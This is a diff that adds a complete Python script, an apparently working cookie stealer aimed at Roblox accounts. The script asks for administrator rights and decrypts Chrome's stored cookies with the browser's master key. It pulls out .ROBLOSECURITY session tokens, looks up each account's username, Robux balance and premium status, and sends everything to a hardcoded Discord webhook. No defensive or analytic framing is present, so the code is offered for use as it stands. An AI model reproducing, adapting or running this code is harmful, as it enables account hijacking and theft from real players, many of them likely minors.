@@ -1,0 +1,159 @@
+import os
+import sys
+import json
+import base64
+import shutil
+import sqlite3
+import ctypes
+import subprocess
+import requests
+from urllib.request import Request, urlopen
+
+# Try importing dependencies
+try:
+    import win32crypt
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
+    import win32crypt
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
+    from Crypto.Cipher import AES
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1399868638218948709/x0VBJgBgWLJQrOByqOC4Xk_OZ0EsN4FKxH3aYs-MYamYTFrBCK21IAcdSGyImeFOIieo"
+
+# Admin check
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    print("[*] Elevating to administrator...")
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(f'"{arg}"' for arg in sys.argv), None, 1)
+    except Exception as e:
+        print(f"[!] Failed to elevate: {e}")
+    sys.exit()
+
+# Get Chrome master key
+def get_chrome_master_key():
+    try:
+        with open(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"), "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception as e:
+        print(f"[!] Failed to get master key: {e}")
+        return None
+
+# Decrypt cookies
+def decrypt_cookie(enc_value, key):
+    try:
+        if enc_value[:3] == b'v10':
+            iv = enc_value[3:15]
+            payload = enc_value[15:-16]
+            tag = enc_value[-16:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt_and_verify(payload, tag).decode()
+        else:
+            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode()
+    except Exception as e:
+        print(f"[!] Failed to decrypt cookie: {e}")
+        return None
+
+# Find Chrome cookie database paths
+def find_cookie_paths():
+    base = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
+    return [
+        os.path.join(base, profile, "Network", "Cookies")
+        for profile in os.listdir(base)
+        if os.path.exists(os.path.join(base, profile, "Network", "Cookies"))
+    ]
+
+# Extract .ROBLOSECURITY cookies
+def get_roblosecurity_cookies():
+    print("[*] Searching for .ROBLOSECURITY cookies...")
+    key = get_chrome_master_key()
+    cookies = []
+    for path in find_cookie_paths():
+        try:
+            shutil.copy2(path, "temp.db")
+            conn = sqlite3.connect("temp.db")
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
+            for host, name, encrypted in cursor.fetchall():
+                decrypted = decrypt_cookie(encrypted, key) if key else None
+                cookies.append({
+                    "host": host,
+                    "decrypted": decrypted,
+                    "raw": base64.b64encode(encrypted).decode()
+                })
+                print(f"[+] Found cookie for {host} | Decrypted: {'Yes' if decrypted else 'No'}")
+            cursor.close()
+            conn.close()
+            os.remove("temp.db")
+        except Exception as e:
+            print(f"[!] Error reading cookie DB: {e}")
+    return cookies
+
+# Get Roblox info (username, robux, premium)
+def get_roblox_info(cookie):
+    try:
+        headers = {
+            "Cookie": f".ROBLOSECURITY={cookie}",
+            "User-Agent": "Roblox/WinInet"
+        }
+        res = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
+        if res.status_code == 200:
+            data = res.json()
+            return {
+                "username": data.get("UserName"),
+                "robux": data.get("RobuxBalance"),
+                "premium": data.get("IsPremium")
+            }
+    except Exception as e:
+        print(f"[!] Failed to get Roblox info: {e}")
+    return {}
+
+# Send results to webhook
+def send_to_webhook(cookies):
+    if not cookies:
+        requests.post(WEBHOOK_URL, json={"content": "[!] No Roblox cookies found."})
+        return
+
+    for i, c in enumerate(cookies, 1):
+        decrypted = c["decrypted"]
+        raw = c["raw"]
+        cookie_display = decrypted if decrypted else f"(Unable to decrypt) [RAW base64] {raw}"
+        info = get_roblox_info(decrypted) if decrypted else {}
+
+        content = (
+            f"**[Cookie #{i}]**\n"
+            f"```{cookie_display[:1900]}```\n"
+            f"**Host:** `{c['host']}`\n"
+        )
+
+        if info:
+            content += (
+                f"**Username:** `{info.get('username', 'N/A')}`\n"
+                f"**Robux:** `{info.get('robux', 'N/A')}`\n"
+                f"**Premium:** `{info.get('premium', 'N/A')}`"
+            )
+
+        requests.post(WEBHOOK_URL, json={"content": content})
+        print(f"[✓] Sent cookie #{i} to webhook.")
+
+# Run script
+print("[*] Running...")
+try:
+    cookies = get_roblosecurity_cookies()
+    send_to_webhook(cookies)
+    print(f"[✓] {len(cookies)} cookie(s) processed.")
+except Exception as e:
+    print(f"[!] Script error: {e}")
+
+input("Press Enter to exit...")
